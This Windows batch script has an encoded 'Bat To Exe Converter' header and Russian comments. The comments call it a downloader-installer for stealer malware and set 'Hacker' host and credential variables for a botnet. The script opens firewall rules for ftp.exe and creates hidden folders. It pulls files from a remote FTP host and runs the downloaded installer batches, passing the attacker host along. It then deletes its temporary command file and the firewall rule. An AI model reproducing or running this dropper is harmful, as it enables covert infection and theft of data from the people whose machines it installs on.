::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyFslLB5acCCNP363A7sI+9TP4PiTrUQOUaIMTqHn27qaKeMB40jte5ch2XRWkcUJQglNQjezfgA6rGBWt1iMOdSIsgPtR0mA6E85CHFmjmGejiovAA==
::fBE1pAF6MU+EWH3eyFslLB5acCCNP363A7sI+9TP4PiTrUQOUaIMTqHn27qaKeMB40jte5ch2XRWkcUJQglNQjezfgA6rGBWt1iMOdSIsgPtR0mA6E85CHFmjmGehSUyAA==
::fBE1pAF6MU+EWH3eyFslLB5acCCNP363A7sI+9TP4PiTrUQOUaIMTqHn27qaKeMB40jte5ch2XRWkcUJQglNQjezfgA6rGBWt1isOdSIsgPtZ0mA6G4oC2p6gm3EjWU5YccI
::fBE1pAF6MU+EWH3eyFslLB5acCCNP363A7sI+9TP4PiTrUQOUaIMTqHn27qaKeMB40jte5ch2XRWkcUJQglNQjezfgA6rGBWt1iSMMKI/Qr5Tyg=
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJECR8Ec+FD9bTxGPOWWuFYko5/rv4OOUpw0uYswDeYHP07ecKe0a5EToepgh33Rf1tkZMD5Abh2lawEgqFJws3eKItWfthzdb1CZ6UU1FXF1l2rTwiI4b7M=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQIVMAtbQgGMKGr6J7ER4ea73+uEqS0=
::eg0/rx1wNQPfEVWB+kM9LVsJDCGaLGS0A7sI6cH1/P6GrkEYRsQraO8=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIULQhdSwqHOCucCadc2/Ho+++K4mwZWesxcZzPyLWaL/IAig==
::dhA7uBVwLU+EWHeB4wIZJg9RXgqHKCuOA7YU5uf34O2e4mEJUKxf
::YQ03rBFzNR3SWATE2kcnaDJaWAGQMm6uRoEZ6+D14OaIpVRdePY7Nu8=
::dhAmsQZ3MwfNWATE2kcnaDJaWAGQMm6uRoEZ6+D14OaIpVRdePY7Nu8=
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJECR8Ec+FD9bTxGPOWWuFYko5/rv4OOUpw0uYswDeYHP07ecKe0a5EToepgh33Rf1tkZMD5Abh2lawEgqFJnrnSKOcKSpw7IRFud50c8HndSk3OeiTM+AA==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
rem Файл загрузки и установки стайлера (Академический вариант)
rem USAGE
rem > loadftpmaindistrib.bat
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host1=%3
rem set Hacker_host2=%4



rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %~dp0\installmaindistrib.ini || exit /b 1

rem Create Windows Firewall Rules
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="FTP.EXE Application rule 1" dir=in action=allow program="%windir%\system32\ftp.exe" enable=yes
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="FTP.EXE Application rule 1" dir=out action=allow program="%windir%\system32\ftp.exe" enable=yes

rem Create target Directory
md %PUB1%
md %PUB1%\Distrib\plugins
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\plugins

rem Go to Temprorary Directory
cd /d %curdir%

::Временный файл команд для утилиты FTP.exe
set CommFTP="%TEMP%\Initial_Script.txt"


rem Определяем переменные:
rem FTP Host
set host=%ftphost%
rem FTP Port
rem set ftpport=21
rem Ftp user
rem set ftpuser=anonymous
rem FTP Password
rem set ftppassword=
rem Основная папка
rem set ftpMainFolder=
rem Папка внутри FTP архива
rem set ftpSubFolder=Exponenta
rem Папка внутри FTP архива
rem set ftpSubFolder1=
rem Маска для файлов
rem set ftpFileMask=*
rem Локальный каталог
set LocalFolder=%PUB1%\Distrib\plugins

rem Delete old versions of the files in catalog C:\pub1\Distrib\plugins
del /Q /F %LocalFolder%\*.*

::Генерируем файл FTP команд
> %CommFTP% (
  echo open %host% %ftpport%
  echo %ftpuser%
  echo.%ftppassword%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolder%"
  if "%ftpMainFolder%" neq "" echo cd "%ftpMainFolder%"
  if "%ftpSubFolder%" neq "" echo cd "%ftpSubFolder%"
  if "%ftpSubFolder1%" neq "" echo cd "%ftpSubFolder1%"
  echo mget %ftpFileMask%
  echo disconnect
  echo quit
)

::Запускаем на выполнение пакетник команд FTP

%windir%\system32\ftp.exe -s:%CommFTP%

::Удаляем пакетник
del /f /q %CommFTP%

rem Копируем wget и запускаем установку в каталоге %LocalFolder%
copy wget.exe %LocalFolder%\wget.exe
copy installmaindistrib.ini %LocalFolder%\
copy installmaindistrib.bat %LocalFolder%\
copy InstallMainExponenta.bat %LocalFolder%\
copy prechocoinstall.bat %LocalFolder%\

rem Run PreChocoInstall.bat
if not exist %LocalFolder%\prechocoinstall.bat goto pass_PreCHInstall
call %LocalFolder%\prechocoinstall.bat
:pass_PreCHInstall

rem Запускаем инсталлятор Admin Pack "Экспонента"
call %LocalFolder%\InstallMainExponenta.bat %PUB1% %Hacker_host1%

rem Переходим в прежний каталог
cd /d %curdir%

rem Удаляем временный каталог
rd /S /Q WindowsPowerShell

rem Уджаляем правила для брандмауэра
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="FTP.EXE Application rule 1"

rem Выход из сценария. Дальше - только функции.
exit /b 0

rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

